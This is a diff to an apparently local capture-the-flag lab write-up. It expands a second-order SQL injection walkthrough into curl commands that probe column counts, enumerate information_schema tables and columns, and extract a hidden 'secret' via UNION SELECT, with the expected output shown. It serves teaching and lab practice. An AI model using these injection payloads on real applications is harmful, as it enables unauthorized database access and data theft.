@@ -104,21 +104,89 @@ as a potential second-order injection vector:
    entire reason this class of bug is under-tested relative to
    first-order injection.
 
-## The walk: hand-crafting the payload
+## The walk: recon → enumeration → flag
 
-`player_cards` has three columns, `id` (INT), `owner` (VARCHAR(64)),
-`inscription` (VARCHAR(255)), and Step 2's vulnerable query selects
-exactly those three, in that order:
+Unlike p3_1, Step 2's report route is fully in-band: it renders whatever
+the vulnerable query returns directly into the page, including errors. That
+makes enumeration straightforward — store a payload via Step 1, trigger
+Step 2, read the result from the report table. Use the reset endpoint
+(`/p3/cursedcard/reset`) between steps to clear previous payloads so the
+appraiser always re-checks the freshest inscription.
 
-```sql
-SELECT id, owner, inscription FROM player_cards WHERE inscription = '<value>'
+### Step 0 — confirm the injection and find the column count
+
+The vulnerable query selects three columns. A UNION must match that count
+exactly. Confirm with `ORDER BY`:
+
+```bash
+# Store a payload that ORDER BY-probes the column count
+curl -s -X POST http://localhost:8000/p3/cursedcard/inscribe \
+    --data-urlencode "inscription=x' ORDER BY 3-- -"
+curl -s http://localhost:8000/p3/cursedcard/report
+# → no error: at least 3 columns exist
+
+curl -s -X POST http://localhost:8000/p3/cursedcard/inscribe \
+    --data-urlencode "inscription=x' ORDER BY 4-- -"
+curl -s http://localhost:8000/p3/cursedcard/report
+# → report_error fires: "Unknown column '4' in 'order clause'" → exactly 3 columns
 ```
 
-The hidden `vault_cards` table mirrors that shape, `id` (INT),
-`card_name` (VARCHAR(64)), `secret` (VARCHAR(128)), a deliberate 3-column
-match, same UNION-injection pattern as `p3_1`'s `sealed_cards`. Closing
-the quote early and appending a `UNION SELECT` against `vault_cards`
-swaps its row in as the report's result:
+Now confirm a 3-column UNION works and identify which columns render in
+the report table (id, owner, inscription display order):
+
+```bash
+curl -s http://localhost:8000/p3/cursedcard/reset
+curl -s -X POST http://localhost:8000/p3/cursedcard/inscribe \
+    --data-urlencode "inscription=x' UNION SELECT 1,2,3-- -"
+curl -s http://localhost:8000/p3/cursedcard/report
+# → report table shows id=1, owner=2, inscription=3  ✓
+```
+
+### Step 1 — get the current database name
+
+```bash
+curl -s http://localhost:8000/p3/cursedcard/reset
+curl -s -X POST http://localhost:8000/p3/cursedcard/inscribe \
+    --data-urlencode "inscription=x' UNION SELECT 1,database(),3-- -"
+curl -s http://localhost:8000/p3/cursedcard/report
+# → owner column: seiyaku_p3_cursed
+```
+
+### Step 2 — enumerate tables in that database
+
+```bash
+curl -s http://localhost:8000/p3/cursedcard/reset
+curl -s -X POST http://localhost:8000/p3/cursedcard/inscribe \
+    --data-urlencode "inscription=x' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0-- -"
+curl -s http://localhost:8000/p3/cursedcard/report
+# → owner column: player_cards
+
+# OFFSET 1:
+# → owner column: vault_cards
+```
+
+Two tables: `player_cards` (the visible deck) and `vault_cards` (never
+referenced by any route's own queries).
+
+### Step 3 — enumerate columns of `vault_cards`
+
+```bash
+curl -s http://localhost:8000/p3/cursedcard/reset
+curl -s -X POST http://localhost:8000/p3/cursedcard/inscribe \
+    --data-urlencode "inscription=x' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='vault_cards' LIMIT 1 OFFSET 0-- -"
+curl -s http://localhost:8000/p3/cursedcard/report
+# → owner column: id
+# OFFSET 1 → card_name
+# OFFSET 2 → secret
+```
+
+Three columns: `id`, `card_name`, `secret`. The flag is in `secret`.
+
+### Step 4 — extract the flag
+
+Step 2's vulnerable query selects three columns in the order `id, owner,
+inscription`. The UNION must match that same 3-column shape. Map
+`vault_cards`'s columns into those same positions:
 
 ```
 inscription = cursed-inscription' UNION SELECT id, card_name, secret FROM vault_cards-- -
